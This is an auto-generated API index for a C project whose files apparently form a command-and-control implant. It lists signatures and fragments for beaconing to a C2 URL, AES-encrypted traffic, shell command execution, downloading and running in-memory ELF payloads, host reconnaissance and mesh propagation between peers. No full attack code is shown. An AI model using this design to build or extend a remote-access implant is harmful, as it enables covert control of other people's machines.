# API

## aes.c

### getSBoxValue (function) `static uint8_t getSBoxValue(uint8_t num)`
- Defined: `aes.c:12`
- Doc: define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16
- Depends on: `aes.h`

### getSBoxInvert (function) `static uint8_t getSBoxInvert(uint8_t num)`
- Defined: `aes.c:34`
- Depends on: `aes.h`

### Td0 (function) `static uint8_t Td0(int x)`
- Defined: `aes.c:56`
- Depends on: `aes.h`

### Td1 (function) `static uint8_t Td1(int x)`
- Defined: `aes.c:58`
- Depends on: `aes.h`

### Td2 (function) `static uint8_t Td2(int x)`
- Defined: `aes.c:59`
- Depends on: `aes.h`

### Td3 (function) `static uint8_t Td3(int x)`
- Defined: `aes.c:60`
- Depends on: `aes.h`

### Td4 (function) `static uint8_t Td4(int x)`
- Defined: `aes.c:61`
- Depends on: `aes.h`

### KeyExpansion (function) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)`
- Defined: `aes.c:166`
- Doc: This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.
- Depends on: `aes.h`

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- Defined: `aes.c:238`
- Depends on: `aes.h`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)`
- Defined: `aes.c:244`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Depends on: `aes.h`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- Defined: `aes.c:249`
- Depends on: `aes.h`

### AddRoundKey (function) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:257`
- Doc: This function adds the round key to state. The round key is added to the state by an XOR function.
- Depends on: `aes.h`

### SubBytes (function) `static void SubBytes(state_t* state)`
- Defined: `aes.c:271`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### ShiftRows (function) `static void ShiftRows(state_t* state)`
- Defined: `aes.c:286`
- Doc: The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = R
- Depends on: `aes.h`

### xtime (function) `static uint8_t xtime(uint8_t x)`
- Defined: `aes.c:313`
- Depends on: `aes.h`

### MixColumns (function) `static void MixColumns(state_t* state)`
- Defined: `aes.c:320`
- Doc: MixColumns function mixes the columns of the state matrix
- Depends on: `aes.h`

### Multiply (function) `static uint8_t Multiply(uint8_t x, uint8_t y)`
- Defined: `aes.c:340`
- Doc: Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up 
- Depends on: `aes.h`

### InvMixColumns (function) `static void InvMixColumns(state_t* state)`
- Defined: `aes.c:370`
- Doc: MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand fo
- Depends on: `aes.h`

### InvSubBytes (function) `static void InvSubBytes(state_t* state)`
- Defined: `aes.c:391`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### InvShiftRows (function) `static void InvShiftRows(state_t* state)`
- Defined: `aes.c:402`
- Depends on: `aes.h`

### Cipher (function) `static void Cipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:433`
- Doc: Cipher is the main function that encrypts the PlainText.
- Depends on: `aes.h`

### InvCipher (function) `static void InvCipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:459`
- Doc: if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
- Depends on: `aes.h`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:488`
- Doc: AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) &&
- Depends on: `aes.h`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:495`
- Depends on: `aes.h`

### XorWithIv (function) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)`
- Defined: `aes.c:510`
- Doc: if defined(CBC) && (CBC == 1)
- Depends on: `aes.h`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:520`
- Depends on: `aes.h`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:535`
- Depends on: `aes.h`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:558`
- Doc: XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC)
- Depends on: `aes.h`

### memcpy (function) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`
- Defined: `aes.c:247`
- Depends on: `aes.h`

## aes.h

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- Defined: `aes.h:40`
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);`
- Defined: `aes.h:43`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- Defined: `aes.h:44`
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:48`
- Doc: if defined(ECB) && (ECB == 1)
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:49`
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:53`
- Doc: if defined(CBC) && (CBC == 1)
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:54`
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `aes.h:58`
- Doc: if defined(CTR) && (CTR == 1)
- Imported by: `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

## beacon.h

### BeaconDataParse (function) `void BeaconDataParse(datap *parser, char *buffer, int size);`
- Defined: `beacon.h:21`
- Doc: === API para BOFs ===
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconDataPtr (function) `char *BeaconDataPtr(datap *parser, int size);`
- Defined: `beacon.h:22`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconDataInt (function) `int BeaconDataInt(datap *parser);`
- Defined: `beacon.h:23`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconDataShort (function) `short BeaconDataShort(datap *parser);`
- Defined: `beacon.h:24`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconDataLength (function) `int BeaconDataLength(datap *parser);`
- Defined: `beacon.h:25`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconDataExtract (function) `char *BeaconDataExtract(datap *parser, int *size);`
- Defined: `beacon.h:26`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...);`
- Defined: `beacon.h:27`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len);`
- Defined: `beacon.h:28`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `bof.c`, `gopher_beacon.c`

## beacon3.c

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `beacon3.c:140`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `beacon3.c:193`
- Doc: === BEACON API ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `beacon3.c:205`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `beacon3.c:217`
- Doc: === CRATE TRAPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `beacon3.c:253`
- Doc: === CLEAN TRAMPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `beacon3.c:268`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon3.c:300`
- Doc: === CURL WRITE CALLBACK ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon3.c:317`
- Doc: === HTTPS REQUEST ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `beacon3.c:406`
- Doc: === BASE64 ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `beacon3.c:422`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon3.c:446`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon3.c:473`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon3.c:504`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `beacon3.c:525`
- Doc: === Función auxiliar: alinear al tamaño de página ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- Defined: `beacon3.c:530`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon3.c:912`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### download_bof (function) `unsigned char* download_bof(const char* url, size_t* out_size)`
- Defined: `beacon3.c:941`
- Doc: === DOWNLOAD BOF ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `beacon3.c:963`
- Doc: === RUN BOF AND CAPTURE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `beacon3.c:1007`
- Doc: === MAIN ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `beacon3.c:63`
- Doc: === TIPOS Y SÍMBOLOS FALTANTES ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### volatile (function) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
- Defined: `beacon3.c:146`
- Doc: CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el 
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `beacon3.c:196`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `beacon3.c:200`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `beacon3.c:211`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fprintf (function) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- Defined: `beacon3.c:224`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### munmap (function) `munmap(code, code_size);`
- Defined: `beacon3.c:240`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### free (function) `free(g_trampolines);`
- Defined: `beacon3.c:257`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fflush (function) `fflush(stderr);`
- Defined: `beacon3.c:321`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `beacon3.c:335`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `beacon3.c:380`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `beacon3.c:412`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `beacon3.c:413`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `beacon3.c:414`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `beacon3.c:415`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `beacon3.c:419`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacon3.c:449`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacon3.c:457`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacon3.c:466`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `beacon3.c:509`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### perror (function) `perror("calloc");`
- Defined: `beacon3.c:701`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `beacon3.c:897`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### close (function) `close(sockfd);`
- Defined: `beacon3.c:920`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `beacon3.c:921`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `beacon3.c:931`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `beacon3.c:933`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacon3.c:937`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### printf (function) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- Defined: `beacon3.c:952`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacon3.c:1009`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sscanf (function) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- Defined: `beacon3.c:1013`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### snprintf (function) `snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);`
- Defined: `beacon3.c:1017`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sleep (function) `sleep(6);`
- Defined: `beacon3.c:1030`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacon3.c:1122`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacon3.c:1130`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacon3.c:1133`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacon3.c:1138`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacon3.c:1142`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacon3.c:1158`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

## beacon5.c

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `beacon5.c:182`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `beacon5.c:235`
- Doc: === BEACON API ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `beacon5.c:247`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `beacon5.c:259`
- Doc: === CRATE TRAPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `beacon5.c:295`
- Doc: === CLEAN TRAMPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `beacon5.c:310`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon5.c:342`
- Doc: === CURL WRITE CALLBACK ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon5.c:359`
- Doc: === HTTPS REQUEST ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `beacon5.c:448`
- Doc: === BASE64 ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `beacon5.c:464`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon5.c:488`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon5.c:515`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon5.c:546`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `beacon5.c:567`
- Doc: === Función auxiliar: alinear al tamaño de página ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- Defined: `beacon5.c:572`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon5.c:954`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### download_bof (function) `unsigned char* download_bof(const char* url, size_t* out_size)`
- Defined: `beacon5.c:983`
- Doc: === DOWNLOAD BOF ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `beacon5.c:1005`
- Doc: === RUN BOF AND CAPTURE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_mark_seen (function) `void mesh_mark_seen(const char *msg_id)`
- Defined: `beacon5.c:1049`
- Doc: ========== UTILIDADES MESH ==========
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_is_seen (function) `int mesh_is_seen(const char *msg_id)`
- Defined: `beacon5.c:1057`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_add_peer (function) `void mesh_add_peer(const char *ip, int port)`
- Defined: `beacon5.c:1069`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_cleanup_peers (function) `void mesh_cleanup_peers()`
- Defined: `beacon5.c:1094`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_send_to_peer (function) `int mesh_send_to_peer(const char *ip, int port, const mesh_msg_t *msg)`
- Defined: `beacon5.c:1108`
- Doc: ========== PROPAGACIÓN MESH ==========
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_propagate (function) `void mesh_propagate(const char *command)`
- Defined: `beacon5.c:1130`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_discovery_thread (function) `void *mesh_discovery_thread(void *arg)`
- Defined: `beacon5.c:1157`
- Doc: ========== DISCOVERY THREAD ==========
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_listener_thread (function) `void *mesh_listener_thread(void *arg)`
- Defined: `beacon5.c:1240`
- Doc: ========== MESH LISTENER THREAD ==========
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### mesh_send_message (function) `void mesh_send_message(int type, const char* target, const char* payload)`
- Defined: `beacon5.c:1416`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### main (function) `int main(int argc, char **argv)`
- Defined: `beacon5.c:1444`
- Doc: === MAIN ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `beacon5.c:104`
- Doc: === TIPOS Y SÍMBOLOS FALTANTES ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### volatile (function) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
- Defined: `beacon5.c:188`
- Doc: CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el 
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `beacon5.c:238`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `beacon5.c:242`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `beacon5.c:253`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fprintf (function) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- Defined: `beacon5.c:266`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### munmap (function) `munmap(code, code_size);`
- Defined: `beacon5.c:282`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### free (function) `free(g_trampolines);`
- Defined: `beacon5.c:299`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fflush (function) `fflush(stderr);`
- Defined: `beacon5.c:363`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `beacon5.c:377`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `beacon5.c:422`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `beacon5.c:454`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `beacon5.c:455`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `beacon5.c:456`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `beacon5.c:457`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `beacon5.c:461`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacon5.c:491`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacon5.c:499`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacon5.c:508`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `beacon5.c:551`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### perror (function) `perror("calloc");`
- Defined: `beacon5.c:743`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `beacon5.c:939`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### close (function) `close(sockfd);`
- Defined: `beacon5.c:962`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `beacon5.c:963`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `beacon5.c:973`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `beacon5.c:975`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacon5.c:979`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### printf (function) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- Defined: `beacon5.c:994`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_mutex_lock (function) `pthread_mutex_lock(&g_mesh.seen_mutex);`
- Defined: `beacon5.c:1051`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strncpy (function) `strncpy(g_mesh.seen_msgs[idx], msg_id, 63);`
- Defined: `beacon5.c:1053`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_mutex_unlock (function) `pthread_mutex_unlock(&g_mesh.seen_mutex);`
- Defined: `beacon5.c:1055`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

